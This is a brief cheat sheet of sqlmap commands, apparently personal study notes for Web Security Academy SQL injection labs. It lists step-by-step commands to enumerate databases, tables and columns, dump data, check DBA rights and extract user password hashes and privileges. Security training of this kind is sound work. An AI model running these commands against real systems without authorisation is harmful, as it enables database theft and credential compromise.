# SQLMap Commands - Replace variables for example "db_name" 


sqlmap  192.168.0.60

#  List databases
 sqlmap -u https://0a75001903d6b435c0dd8cb50046000a.web-security-academy.net/filter?category=Tech+gifts~ --dbs   

#  List tables from "db_name"
 sqlmap -u https://0a75001903d6b435c0dd8cb50046000a.web-security-academy.net/filter?category=Tech+gifts~ -D "db_name" --tables

#  List columns specified by table (-T) and database (-D)
 sqlmap -u https://0a75001903d6b435c0dd8cb50046000a.web-security-academy.net/filter?category=Tech+gifts~ -D "db_name" -T "table_name" --columns

#  Extract dump (read columns values).  Do not remove column1, column2 double quotes!
 sqlmap -u https://0a75001903d6b435c0dd8cb50046000a.web-security-academy.net/filter?category=Tech+gifts~ -D "db_name" -T "table_name" --columns "column1, column2" --dump

#  Read the current user (used by SQLMap) and confirm DBA role
 sqlmap -u https://0a2c004203e8b424c08ca099009a00b8.web-security-academy.net/filter?category=Food+%26+Drink --current-user --is-dba

#  List users, password and your privileges on the database
 sqlmap -u https://0a2c004203e8b424c08ca099009a00b8.web-security-academy.net/filter?category=Food+%26+Drink --current-user --is-dba --users --passwords --privileges


#    Performance Flags
    
    --batch # auto-confirm Y on y/n question.
    --threads 1-10 # Increase or decrease cpu utilization of your machine. 